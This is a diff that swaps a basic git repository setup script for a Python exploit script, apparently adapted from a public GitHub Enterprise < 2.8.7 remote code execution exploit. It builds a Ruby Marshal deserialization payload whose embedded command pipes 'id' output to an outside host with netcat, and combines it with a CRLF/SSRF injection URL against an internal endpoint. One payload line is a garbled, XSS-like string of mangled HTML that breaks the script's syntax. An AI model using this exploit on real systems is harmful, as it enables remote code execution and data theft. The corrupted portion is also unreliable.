@@ -1,8 +1,30 @@
-echo "# azx" >> README.md
-git init
-git add README.md
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/basir24/azx.git
-git push -u origin main
-                
+#!/usr/bin/python
+from urllib import quote
+
+''' set up the marshal payload from IRB
+code = "`id | nc azx.se 8080`"
+p "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
+'''
+marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`id | nc azx.se 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'
+
+payload = [
+    '',
+    'set xss?name=azx<p class=""ale-rt-(1) col-sm-alert-(1) ale-rt-1 col-md-offset-2 img"">ale-rt-(1)<li class="navbar-right">aler-rt-(1)<h1 id="navbar" class="navbar-collapse collapse"><ul class="nav navbar-nav navbar-right"><li><hl=a scr="http://azx.se"></hl=a></li>/<hl=a =<get?uri=javascript>aler-t(1)> len(marshal_code),
+    marshal_code,
+    '',
+    ''
+]
+
+payload = map(quote, payload)
+url = 'http://0:8000/composer/send_email?to=basiralizadehazx.se&url=http://127.0.0.1:8080/'
+
+print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by orange@chroot.org"
+print '-'*10 + '\n'
+print url + '%0D%0A'.join(payload)
+print '''
+Inserting WebHooks from:
+https://github.com/basir24/azx.git
+
+Triggering RCE from:
+https://ghe-server/search?q=ggggg&type=Repositories
+'''
